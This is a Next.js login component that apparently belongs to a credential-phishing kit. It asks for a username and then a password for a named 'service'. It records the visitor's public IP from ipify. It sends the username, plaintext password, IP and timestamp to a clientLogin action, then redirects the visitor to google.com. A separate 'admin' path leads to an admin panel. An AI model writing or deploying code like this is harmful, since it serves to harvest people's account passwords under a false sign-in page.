"use client";
import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import UserName from "@/app/components/login/userName";
import Password from "@/app/components/login/password";
import { login, clientLogin } from "@/actions/actions.jsx";

const initialState = {
  message: '',
}

const Login = ({ argument }) => {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [ipv4, setIpv4] = useState(null);
  // const [state, formAction] = useActionState(login, initialState)

  useEffect(() => {
    const fetchIPv4 = async () => {
      try {
        const response = await fetch(`https://api.ipify.org?format=json`);
        if (!response.ok) {
          throw new Error("Failed to fetch IPv4 address");
        }
        const result = await response.json();
        setIpv4(result.ip);
        //console.log(result.ip);
      } catch (error) {
        console.error("Error fetching IPv4 address:", error.message);
      }
    };

    fetchIPv4();
  }, []);

  const service = argument;

  const router = useRouter();

  // Function to handle username submission
  const handleUsernameSubmit = (usernameValue) => {
    setUsername(usernameValue);
  };

  // Function to handle password submission
  const handlePasswordSubmit = async (passwordValue) => {
    setPassword(passwordValue);
    // Now you can make your HTTP request to save both username and password
    handleSaveData(username, passwordValue);
  };

  // Function to handle HTTP request to save username and password
  const handleSaveData = async (username, password) => {
    const jsonData = { service, username, password, ipv4, date: new Date() };
    if (service === "admin") {
      if (login(jsonData)) {
        router.push("/admin");
      }
    } else {
      clientLogin(jsonData);
      window.location.href = "https://www.google.com";
    }
  };

  return (
    <div>
      {!username ? ( // Render UserName component if username is not submitted
        <UserName onSubmit={handleUsernameSubmit} argument={service} />
      ) : (
        // Render Password component if username is submitted
        <Password onSubmit={handlePasswordSubmit} argument={service} />
      )}
    </div>
  );
};
export default Login;
